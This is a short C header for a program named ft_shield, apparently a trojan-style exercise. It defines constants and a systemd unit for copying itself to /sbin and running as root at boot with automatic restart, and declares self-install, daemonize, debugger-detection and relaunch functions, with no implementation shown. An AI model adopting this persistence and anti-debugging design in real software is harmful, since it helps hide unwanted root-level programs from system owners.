#ifndef FT_SHIELD_H
#define FT_SHIELD_H

#define SERVICE_NAME "ft_shield"
#define PID_FILE "/run/ft_shield.pid"
#define BIN_LOCATION "/sbin/ft_shield"
#define SYSTEMD_SERVICE_FILE "/etc/systemd/system/ft_shield.service"
#define SYSTEMD_CONFIG "[Unit]\n\
                        Description=ft_shield\n\
                        After=network.target\n\n\
                        [Service]\n\
                        ExecStart=%s\n\
                        Type=forking\n\
                        Restart=on-failure\n\
                        PIDFile=%s\n\n\
                        User=root\n\n\
                        [Install]\n\
                        WantedBy=multi-user.target\n"

#define PAGE_SIZE 4096
#define CHAR_BUFFER 512
#define ATTEMPTS 5

int is_installed();
int install_self();

void daemonize();
void run_daemon();

int detect_debugging();
void fork_and_relaunch();

#endif // FT_SHIELD_H
